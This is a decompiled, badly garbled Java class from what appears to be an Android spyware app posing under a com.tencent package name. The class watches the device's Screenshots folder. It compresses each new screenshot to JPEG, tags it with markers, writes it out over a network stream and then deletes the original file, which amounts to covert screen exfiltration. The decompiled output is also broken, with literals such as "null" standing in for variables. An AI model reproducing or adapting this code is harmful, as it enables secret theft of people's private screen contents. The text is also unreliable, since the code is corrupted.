package com.tencent;

import android.content.*;
import android.view.*;
import android.widget.*;
import android.app.*;
import android.os.*;
import android.accessibilityservice.*;
import android.view.accessibility.*;
import android.telephony.*;
import android.media.*;
import java.util.*;
import java.io.*;
import java.net.*;

/**
 * Deobfuscated class: AccessibilityServiceCore_11
 * Original: Lcom/tencent/tunesxconcerningn1012$11;
 */
class AccessibilityServiceCore_11 extends FileObserver {

    // === FIELDS ===
    final AccessibilityServiceCore this$0;

    // === METHODS ===

     void Constructor(AccessibilityServiceCore param0, String param1, int param2) {
        v0.this$0 = v1;
        // new FileObserver(v2, v3)
        return;
    }

    public void onEvent(int param0, String param1) {
        v8 = ":";
        v0 = new StringBuilder();
        // new StringBuilder()
        v1 = Environment.getExternalStorageDirectory();
        v0.append(v1);
        v1 = File.separator;
        v0.append(v1);
        v1 = Environment.DIRECTORY_PICTURES;
        v0.append(v1);
        v1 = File.separator;
        v0.append(v1);
        v1 = "Screenshots";
        v0.append("Screenshots");
        v0.append("Screenshots");
        v0.toString();
        if (v9 == null || v9 == 0) { // goto +196
        if (v9 == "null") { // goto +192
        v2 = v9.length();
        if ("null" <= 0) { // goto +186
        v2 = new StringBuilder();
        // new StringBuilder()
        v2.append(v0);
        v2.append(v9);
        v2.toString();
        // new File(v2)
        "null".exists();
        if ("null" != null && "null" != 0) { // goto +3
        return;
        // new StringBuilder()
        "null".append(v0);
        "null".append(v9);
        "null".toString();
        v2 = BitmapFactory.decodeFile("null");
        if ("null" != null && "null" != 0) { // goto +3
        return;
        v2 = new ByteArrayOutputStream();
        // new ByteArrayOutputStream()
        v5 = "null".getWidth();
        v5 = "null".getHeight();
        v5 = 0;
        v3 = Bitmap.createBitmap("null", 0, 0, v3, v4);
        v3 = Bitmap$CompressFormat.JPEG;
        v4 = 20;
        "null".compress(v3, 20, v2);
        v2 = v2.toByteArray();
        v2 = v7.this$0;
        v3 = v2.getApplicationContext();
        v3 = "SCH";
        v6 = My_tunesxconcerningn10_Settings.read(v2, "SCH", "720");
        v6 = "SCH".getApplicationContext();
        v6 = "1080";
        My_tunesxconcerningn10_Settings.read("SCH", "SCW", "1080");
        // new StringBuilder()
        "SCW".append("1080");
        "SCW".append(":");
        "SCW".append("SCH");
        "SCW".append(":");
        "SCW".append(v2);
        "SCW".append(":");
        "SCW".append(":");
        "SCW".append(":SK:");
        v2 = "SCW".toString();
        v2 = DataPackagingEngine.eliminateicoolerh28(":SK:", "null");
        v2 = ":SK:".length;
        "null".setSendBufferSize(v2);
        v2 = ":SK:".length;
        "null".write(":SK:", 0, v2);
        // new StringBuilder()
        "null".append(v0);
        "null".append(v9);
        "null".toString();
        // new File(v9)
        ":SK:".delete();
        return;
    }
}
